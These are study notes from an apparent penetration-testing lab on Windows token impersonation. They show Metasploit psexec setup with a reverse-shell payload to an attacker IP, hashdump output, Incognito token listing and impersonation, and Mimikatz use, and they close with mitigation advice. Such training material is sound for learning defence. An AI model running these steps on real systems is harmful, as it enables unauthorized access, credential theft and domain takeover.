## Token Impersonation Overview

### What are Tokens?

- **Definition**: Temporary keys that grant access to systems or networks without providing credentials, similar to cookies.
- **Types of Tokens**:
    - **Delegate Token**: Used for logging into a machine or remote desktop.
    - **Impersonate Token**: Used for network drives or domain login scripts.

---

### Steps in Token Impersonation

1. **Setup**:
    - Gain a shell (e.g., via Meterpreter).
    - Use tools like _Incognito_ to list tokens available on the machine.
2. **Impersonation Process**:
    - Identify a token (e.g., Marvel f Castle).
    - Impersonate the token using commands:
        
        ```Plain
        impersonate_token [TOKEN_NAME]
        ```
        
    - Test access to verify the token’s privileges.
3. **Elevation**:
    - If a Domain Admin token is found, impersonate it:
        
        ```Plain
        impersonate_token [DOMAIN_ADMIN_TOKEN]
        ```
        
    - Gain access to sensitive operations, such as dumping all domain hashes (e.g., with Invoke-Mimikatz).

---

### Key Concepts

- **Access Control**: Operations like dumping domain controller hashes require admin privileges.
- **Lateral Movement**: Tokens from different machines can vary; move laterally to discover higher-privilege tokens.

---

### Demonstration Recap

1. Log into a machine and list available tokens using _Incognito_.
2. Impersonate tokens:
    - Test access initially as a regular user.
    - Impersonate a Domain Admin if available.
3. Use tools like Invoke-Mimikatz for privileged operations after impersonation.

---

### Risks and Impact

- **Key Threat**: If a Domain Admin token is impersonated, full domain control is achieved.
- **Critical Objective**: Search for high-privilege tokens when moving laterally.

---

## Token Impersonation: Practical Implementation

### Setup (Metasploit psexec module)

1. **Load Metasploit Framework**:
    
    ```Shell
    msfconsole
    ```
    
2. **Search and Use the PSExec Exploit**:
    
    ```Shell
    use exploit/windows/smb/psexec
    ```
    
3. **Set Exploit Options**:  
      
    Example:
    
    ```Shell
    set RHOSTS [TARGET_IP]
    set SMBDomain [DOMAIN_NAME]
    set SMBUser [USERNAME]
    set SMBPass [PASSWORD]
    ```
    
    ```Shell
    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set RHOSTS 192.168.213.130
    RHOSTS => 192.168.213.130
    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set smbdomain marvel.local
    smbdomain => marvel.local
    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set smbpass Password@01
    smbpass => Password@01
    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set smbuser fcastle
    smbuser => fcastle
    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> show targets
    
    ```
    
4. **Show target**
    
    ```Bash
    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> show targets
    
    Exploit targets:
    =================
    
        Id  Name
        --  ----
    =>  0   Automatic
        1   PowerShell
        2   Native upload
        3   MOF upload
        4   Command
    ```
    
5. Set Target
    
    ```Bash
    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set target 2
    target => 2
    ```
    
6. **Specify Payload**:
    
    ```Shell
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST [ATTACKER_IP]
    ```
    
7. **Verify Options and Exploit**:
    
    ```Shell
    show options
    run
    ```
    
8. **Meterpreter Session Opened** 
    
    ```Bash
    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> run
    
    [*] Started reverse TCP handler on 192.168.213.160:4444 
    [*] 192.168.213.130:445 - Connecting to the server...
    [*] 192.168.213.130:445 - Authenticating to 192.168.213.130:445|marvel.local as user 'fcastle'...
    [!] 192.168.213.130:445 - peer_native_os is only available with SMB1 (current version: SMB3)
    [*] 192.168.213.130:445 - Uploading payload... abWrnKHB.exe
    [*] 192.168.213.130:445 - Created \abWrnKHB.exe...
    [*] Sending stage (203846 bytes) to 192.168.213.130
    [+] 192.168.213.130:445 - Service started successfully...
    [*] 192.168.213.130:445 - Deleting \abWrnKHB.exe...
    [*] Meterpreter session 1 opened (192.168.213.160:4444 -> 192.168.213.130:51972) at 2025-01-06 19:55:58 +0400
    
    (Meterpreter 1)(C:\Windows\system32) >
    ```
    
9. Useful commands
    1. Hashdump
        
        ```Bash
        (Meterpreter 1)(C:\Windows\system32) > hashdump
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:627a55d9b030f24af2c8f1a73a8b079a:::
        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:16f0162fe46f7f1af9939f27ad5a8d6d:::
        (Meterpreter 1)(C:\Windows\system32) > 
        ```
        
    2. Get User ID
        
        ```Bash
        (Meterpreter 2)(C:\Windows\system32) > getuid
        Server username: NT AUTHORITY\SYSTEM
        ```
        
    3. Get System info
        
        ```Bash
        (Meterpreter 2)(C:\Windows\system32) > sysinfo
        Computer        : PUNISHER
        OS              : Windows 10 (10.0 Build 19045).
        Architecture    : x64
        System Language : en_US
        Domain          : MARVEL
        Logged On Users : 7
        Meterpreter     : x64/windows
        ```
        

### Using Incognito for Token Operations

1. Show all modules available to load
    
    ```Bash
    (Meterpreter 2)(C:\Windows\system32) > load -l
    ```
    
2. **Load Incognito Module**:
    
    ```Shell
    load incognito
    ```
    
3. **Incognito Help**
    
    ```Bash
    Incognito Commands
    ==================
    
        Command                   Description
        -------                   -----------
        add_group_user            Attempt to add a user to a global group with all tokens
        add_localgroup_user       Attempt to add a user to a local group with all tokens
        add_user                  Attempt to add a user with all tokens
        impersonate_token         Impersonate specified token
        list_tokens               List tokens available under current user context
        snarf_hashes              Snarf challenge/response hashes for every toke
    ```
    
4. **List Available Tokens**:
    - For Users: `list_tokens -u`
    - For Groups: `list_tokens -g`
5. **List Tokens**
    
    ```Bash
    (Meterpreter 2)(C:\Windows\system32) > list_tokens -u
    
    Delegation Tokens Available
    ========================================
    Font Driver Host\UMFD-0
    Font Driver Host\UMFD-1
    MARVEL\superuser
    NT AUTHORITY\LOCAL SERVICE
    NT AUTHORITY\NETWORK SERVICE
    NT AUTHORITY\SYSTEM
    Window Manager\DWM-1
    
    Impersonation Tokens Available
    ========================================
    No tokens available
    ```
    
6. **Impersonate a Token**:
    
    ```Shell
    impersonate_token [DOMAIN\\USERNAME]
    ```
    
    Example:
    
    ```Shell
    (Meterpreter 2)(C:\Windows\system32) > impersonate_token marvel\\superuser
    [+] Delegation token available
    [+] Successfully impersonated user MARVEL\superuser
    (Meterpreter 2)(C:\Windows\system32) >
    ```
    
7. **Verify Impersonation**:
    
    ```Shell
    shell
    whoami
    ```
    
    - Example
    
    ```Bash
    (Meterpreter 3)(C:\Windows\system32) > shell
    Process 9916 created.
    Channel 1 created.
    Microsoft Windows [Version 10.0.19045.5247]
    (c) Microsoft Corporation. All rights reserved.
    
    C:\Windows\system32>whoami
    whoami
    marvel\superuser
    
    C:\Windows\system32>
    ```
    
8. If you are trying to run hashdump, you cannot as the impersonated token (user)
    1. You will need to run: **rev2self**
        1. This will cause you to return to your previously logged in user through psexec

### Real-World Application of Delegate Tokens

1. **Scenario**:
    - Tokens persist until a machine is rebooted.
    - If a domain admin previously logged into the target machine, the admin token remains available.
    - Basically any admin or user that logs into the machine that you have credential access to, you can impersonate their session through their delegate token access with the use of incognito
2. **Example Steps**:
    - After logging into a target (e.g., Frank Castle’s account), impersonate the new token:
    - Now you have more user tokens that you can impersonate based on their logged in user sessions
        
        ```Bash
        (Meterpreter 4)(C:\Windows\system32) > list_tokens -u
        
        Delegation Tokens Available
        ========================================
        Font Driver Host\UMFD-0
        Font Driver Host\UMFD-1
        Font Driver Host\UMFD-2
        Font Driver Host\UMFD-3
        MARVEL\fcastle
        MARVEL\superuser
        NT AUTHORITY\LOCAL SERVICE
        NT AUTHORITY\NETWORK SERVICE
        NT AUTHORITY\SYSTEM
        PUNISHER\Administrator
        Window Manager\DWM-1
        Window Manager\DWM-2
        Window Manager\DWM-3
        
        Impersonation Tokens Available
        ========================================
        No tokens available
        ```
        
    - Verify impersonation and capabilities with:
        
        ```Shell
        shell
        whoami
        ```
        

### Notes on Escalation

- **Token Persistence**:
    - Delegate tokens from interactive sessions (login or RDP) last until reboot.
    - Domain Admin tokens on servers persist due to infrequent reboots.
- **Lateral Movement**:
    - Move laterally across machines, looking for higher-privilege tokens.
    - Impersonating such tokens enables significant escalation, up to domain administrator privileges.

### Key Commands Overview

- **Session Reversion**:
    - Revert to the original session to regain the attacker’s initial identity:
        
        ```Shell
        rev2self
        ```
        
- **Access Validation**:
    - Commands to validate impersonated user access levels and actions:
        
        ```Shell
        hashdump
        ```
        

### Potential Scenarios

- Attacks often succeed in environments where:
    - Users with high privileges log in and leave behind tokens.
    - Machines/servers experience long uptime periods without reboots.
    - Systems lack monitoring and mitigation measures for token misuse.

## Token Impersonation Mitigation Strategies

### Key Strategies

1. **Limit User and Group Token Creation Permissions**:
    - Reducing token creation capabilities restricts what an attacker can exploit.
    - While effective, this alone won't eliminate all risks.
2. **Enforce Account Tiering**:
    - **Practice**:
        - Assign separate accounts for administrative and standard user activities.
        - Example:
            - Regular user account: `Bob`
            - Admin account: `Bob-a` (for use only on Domain Controllers).
    - **Purpose**:
        - Prevent attackers from leveraging privileges of compromised user accounts to access domain controllers.
        - Enforce stricter password policies and permissions for admin-tier accounts.
3. **Restrict Domain Administrator Logins**:
    - Domain Admins should only log into domain controllers.
    - **Risk**:
        - If a Domain Admin logs into another machine (e.g., user PCs or non-critical servers) and the machine is compromised, the token can be exploited.
    - Limiting logins reduces attack vectors across the network.
4. **Local Admin Restrictions**:
    - Restrict regular users from having local admin rights on their systems.
    - **Impact**:
        - Prevent attackers from gaining a foothold and executing token impersonation on machines owned by standard users.

### Importance of Policies

- These measures revolve around common-sense policies:
    - **Isolate high-privilege accounts**: Only use them where strictly necessary.
    - **Control local admin privileges**: Avoid users having unnecessary permissions.
    - **Longer and stronger passwords**: Especially for privileged accounts.

### Challenges

- Many networks fail to implement these basic policies, leaving them vulnerable to attacks.

---

### Recap

- Effective policy enforcement is repetitive but highly impactful.
- Proper segregation and restriction policies can prevent attackers from performing token impersonation and numerous other attacks.

---

Let me know if you'd like this saved as a `.txt` file!